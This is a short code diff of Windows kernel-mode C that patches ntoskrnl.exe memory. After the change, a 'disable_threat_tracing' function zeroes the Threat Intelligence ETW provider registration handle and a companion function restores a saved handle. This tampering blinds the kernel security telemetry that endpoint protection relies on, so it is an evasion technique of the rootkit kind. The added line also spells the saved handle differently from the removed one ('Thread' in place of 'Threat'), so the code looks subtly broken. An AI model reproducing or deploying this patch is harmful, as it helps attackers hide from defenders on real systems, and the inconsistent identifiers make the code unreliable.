@@ -13,10 +13,10 @@ __forceinline VOID get_EtwThreatIntProvRegHandle()
 
 __forceinline VOID disable_threat_tracing()
 {
-    *(ULONG64*)((ULONG64)get_ldr_entry(L"ntoskrnl.exe") + EtwThreatIntProvRegHandle_offset) = old_EtwThreatIntProvRegHandle;
+    *(ULONG64*)((ULONG64)get_ldr_entry(L"ntoskrnl.exe") + EtwThreatIntProvRegHandle_offset) = 0ULL;
 }
 
 __forceinline VOID enable_thread_tracing()
 {
-    *(ULONG64*)((ULONG64)get_ldr_entry(L"ntoskrnl.exe") + EtwThreatIntProvRegHandle_offset) = 0ULL;
+    *(ULONG64*)((ULONG64)get_ldr_entry(L"ntoskrnl.exe") + EtwThreatIntProvRegHandle_offset) = old_EtwThreadIntProvRegHandle;
 }
